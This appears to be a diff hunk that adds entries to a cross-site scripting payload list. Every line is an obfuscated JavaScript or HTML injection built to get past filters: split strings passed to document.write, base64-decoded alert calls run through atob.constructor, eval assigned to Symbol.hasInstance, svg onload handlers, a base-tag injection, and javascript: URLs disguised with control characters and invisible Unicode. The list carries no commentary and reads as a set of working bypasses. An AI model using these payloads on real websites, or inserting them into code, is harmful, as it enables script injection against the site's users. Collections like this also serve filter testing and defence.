@@ -32,4 +32,12 @@ top["al"+"ert"](5);
 new Function`al\ert\`6\``;
 <math><annotation-xml encoding="text/html"><xmp>&lt;/xmp&gt;&lt;img src=x onerror=alert(1)&gt;</xmp>
 import('da\r\nta:text/\ecmascript\,alert%601%60')
-
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+document.location=unescape("%19Jav%09asc%09ript:https ://foobar/%250Aconfirm%25281%2529")
+http://window.open ("http://tpc.googlesyndication.com/safeframe/1-0- …","1;25;<svg/onload=alert(/XSS/)>true")
+atob.constructor(atob`YWxlcnQoMSk`)``
+atob.constructor(atob(/YWxlcnQoMSk/.source))()
+window[Symbol.hasInstance]=eval
+atob`YWxlcnQoMSk` instanceof window
+location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'
+document.write("<s","crip","t>al","ert(","1)","</s","cript>")
